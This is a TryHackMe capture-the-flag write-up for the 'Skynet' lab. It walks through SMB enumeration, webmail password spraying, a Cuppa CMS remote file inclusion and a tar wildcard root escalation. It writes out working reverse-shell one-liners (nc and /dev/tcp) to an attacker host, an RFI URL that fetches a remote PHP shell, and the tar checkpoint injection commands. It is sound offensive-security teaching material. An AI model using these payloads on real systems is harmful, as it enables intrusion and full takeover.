# Skynet - TryHackMe

> **Kill Chain Summary**:
> Port Scanning (SSH, HTTP, Mail, SMB) -> Anonymous SMB Share Enumeration (`attention.txt` and Wordlist `log1.txt`) -> SquirrelMail Webmail Brute-Force (`milesdyson`) -> Extraction of Cleartext SMB Password from Email -> Authenticated SMB Access -> Hidden Web Directory Discovery via `notes/important.txt` -> Cuppa CMS Remote File Inclusion (RFI) via `alertConfigField.php` -> Reverse Shell as `www-data` -> Crontab Enumeration (Root Tar Backup with Wildcard) -> Tar Command-Line Argument Injection -> Root Shell (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Skynet |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | SMB Anonymous Enumeration, Password Spraying, SquirrelMail Webmail Exploitation, Cuppa CMS Remote File Inclusion (RFI), Tar Wildcard Privilege Escalation |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was executed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.130.139.117 10.130.139.117
```

**Open Ports:**

| Port | Service | Version |
| :--- | :--- | :--- |
| 22/tcp | SSH | OpenSSH 7.2p2 |
| 80/tcp | HTTP | Apache httpd 2.4.18 |
| 110/tcp | POP3 | Dovecot pop3d |
| 139/tcp | SMB | Samba 4.3.11-Ubuntu |
| 143/tcp | IMAP | Dovecot imapd |
| 445/tcp | SMB | Samba 4.3.11-Ubuntu |

### 1.2 Web Enumeration (Port 80)

Browsing to `http://10.130.139.117/` displays a custom Skynet search engine interface:

![Screenshot](../../attachments/Pasted%20image%2020260603120510.png)

A directory brute-force attack using Gobuster identified the following endpoints:

```bash
gobuster dir -u http://10.130.139.117/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/admin               (Status: 403)
/config              (Status: 403)
/squirrelmail        (Status: 301) [--> http://10.130.139.117/squirrelmail/]
```

Navigating to `/squirrelmail/` presents a SquirrelMail login interface:

![Screenshot](../../attachments/Pasted%20image%2020260603121430.png)
![Screenshot](../../attachments/Pasted%20image%2020260603121816.png)

Checking POP3/IMAP services on ports 110 and 143 returned standard banners without enabling anonymous access:

![Screenshot](../../attachments/Pasted%20image%2020260603122413.png)

### 1.3 SMB Enumeration

Enumerating SMB shares via `enum4linux`:

```bash
enum4linux -a 10.130.139.117
```

![Screenshot](../../attachments/Pasted%20image%2020260603142020.png)

The enumeration identified an accessible `anonymous` share alongside user shares including `milesdyson`.

Connecting to the anonymous share with `smbclient`:

```bash
smbclient //10.130.139.117/anonymous -N
```

![Screenshot](../../attachments/Pasted%20image%2020260603142540.png)

Inspecting the downloaded files:
- `attention.txt`: A memorandum signed by **Miles Dyson** notifying staff that all employee passwords had been changed due to a system malfunction.
- `log1.txt`: A password wordlist containing 31 variations of passwords based on Terminator references.
- `log2.txt` / `log3.txt`: Empty text files.

This provides a target username (`milesdyson`) and a targeted wordlist (`log1.txt`).

---

## 2. Initial Access

### 2.1 Webmail Authentication

Using the targeted password list `log1.txt`, credential spraying was performed against the SquirrelMail interface for username `milesdyson`. The credential succeeded:
- **Username:** `milesdyson`
- **Password:** `cyborg007haloterminator`

![Screenshot](../../attachments/Pasted%20image%2020260603144410.png)

Inside the mailbox, the first email contained Miles Dyson's personal SMB password:

![Screenshot](../../attachments/Pasted%20image%2020260603144625.png)

Subsequent emails contained AI-generated dialogue and lyrics:

![Screenshot](../../attachments/Pasted%20image%2020260603144942.png)
![Screenshot](../../attachments/Pasted%20image%2020260603145025.png)
![Screenshot](../../attachments/Pasted%20image%2020260603145202.png)

### 2.2 Authenticated SMB Access & Hidden Directory

Using the extracted password, access was authenticated to Miles Dyson's private SMB share:

```bash
smbclient //10.130.139.117/milesdyson -U milesdyson
```

![Screenshot](../../attachments/Pasted%20image%2020260603154100.png)

Navigating into the `notes` directory revealed `important.txt`:

![Screenshot](../../attachments/Pasted%20image%2020260603154509.png)
![Screenshot](../../attachments/Pasted%20image%2020260603154550.png)

The file discloses a hidden web directory: `/45kra24zxs28v3yd/`.

### 2.3 Web Enumeration on the Hidden Directory

Fuzzing the newly discovered path with Gobuster:

```bash
gobuster dir -u http://10.129.157.110/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt
```

The scan identifies an administrative interface: `/45kra24zxs28v3yd/administrator`:

![Screenshot](../../attachments/Pasted%20image%2020260603162536.png)

The page runs an instance of **Cuppa CMS**.

### 2.4 Cuppa CMS Remote File Inclusion (RFI) Exploitation

Searching for exploits targeting Cuppa CMS:

```bash
searchsploit cuppa cms
```

![Screenshot](../../attachments/Pasted%20image%2020260603170740.png)

> [!NOTE] Concept: Remote File Inclusion (RFI)
> The script `/alerts/alertConfigField.php` accepts a parameter `urlConfig` that directly includes remote PHP files via `include()` or `require()` without sanitization or disabling `allow_url_include`.

#### Staging Payload
1. Host a PHP reverse shell script (`php-reverse-shell.php`) on the Kali attack host:

```bash
python3 -m http.server 80
```

![Screenshot](../../attachments/Pasted%20image%2020260604003559.png)

2. Set up a Netcat listener:

```bash
nc -lvnp 4444
```

![Screenshot](../../attachments/Pasted%20image%2020260604003650.png)

3. Trigger the RFI via GET request:

```text
http://10.129.157.110/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.14.5/php-reverse-shell.php
```

![Screenshot](../../attachments/Pasted%20image%2020260604003724.png)

The server fetches the remote file, executes the payload, and connects to the listener as `www-data`.

Retrieve the user flag:

```bash
cat /home/milesdyson/user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Cron Job Enumeration

Inspecting scheduled system tasks in `/etc/crontab`:

```bash
cat /etc/crontab
```

```text
# m h dom mon dow user  command
*/1 * * * *   root    cd /var/www/html && tar czf /var/backups/backup.tar.gz *
```

A root cron job executes every minute. It enters `/var/www/html` and runs `tar czf /var/backups/backup.tar.gz *` using a wildcard (`*`).

### 3.2 Exploitation: Tar Wildcard Argument Injection

> [!NOTE] Concept: Wildcard Parameter Injection in Tar
> When a shell executes `tar ... *`, the asterisk expands to include all filenames in the current directory. If files are created whose names match valid command-line flags (such as `--checkpoint=1` and `--checkpoint-action=exec=...`), `tar` interprets those filenames as CLI options rather than archive inputs.

Since `www-data` has write permissions inside `/var/www/html`, this wildcard expansion can be weaponized.

#### Step 1: Create the Payload Script
Create a reverse shell script in `/var/www/html`:

```bash
cd /var/www/html
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 1234 >/tmp/f" > shell.sh
chmod +x shell.sh
```

#### Step 2: Create Argument Files
Generate files that `tar` will parse as operational arguments:

```bash
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

#### Step 3: Catch Root Shell
Start a listener on port 1234:

```bash
nc -lvnp 1234
```

Within 60 seconds, the cron job executes, parses `--checkpoint-action=exec=sh shell.sh`, and invokes `shell.sh` as `root`:

![Screenshot](../../attachments/Pasted%20image%2020260604010756.png)

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# SMB Share Listing with Authentication
smbclient //<TARGET_IP>/<SHARE> -U <USERNAME>

# Recursive Directory Fuzzing
gobuster dir -u http://<TARGET_IP>/<PATH>/ -w /usr/share/wordlists/dirb/common.txt

# Cuppa CMS RFI Execution
curl -s "http://<TARGET_IP>/<CMS_PATH>/alerts/alertConfigField.php?urlConfig=http://<KALI_IP>/shell.php"

# Tar Wildcard Injection Setup
echo 'bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1' > shell.sh
touch "--checkpoint-action=exec=sh shell.sh"
touch "--checkpoint=1"
```

---

## 5. Key Takeaways and Lessons Learned

1. **Authentication Prioritization:** When credentials or password wordlists are obtained, prioritize testing webmail and administrative web consoles over protocol-heavy services like SMB or SSH. Webmail often yields further cleartext credentials and system paths.
2. **Recursive Web Discovery:** Never stop enumeration at the primary web root. Internal notes, backup files, and documentation recovered from SMB shares frequently disclose secondary hidden application paths.
3. **Wildcard Expansion Risks in Cron Jobs:** Avoid using wildcards (`*`) in scheduled scripts executed by elevated accounts. Commands like `tar`, `chown`, and `chmod` expand filenames into flags, allowing lower-privileged users who can create files in that directory to inject arbitrary arguments.

---

#tryhackme #linux #easy #smb #webmail #squirrelmail #cuppa-cms #rfi #cron #wildcard-injection #tar #privesc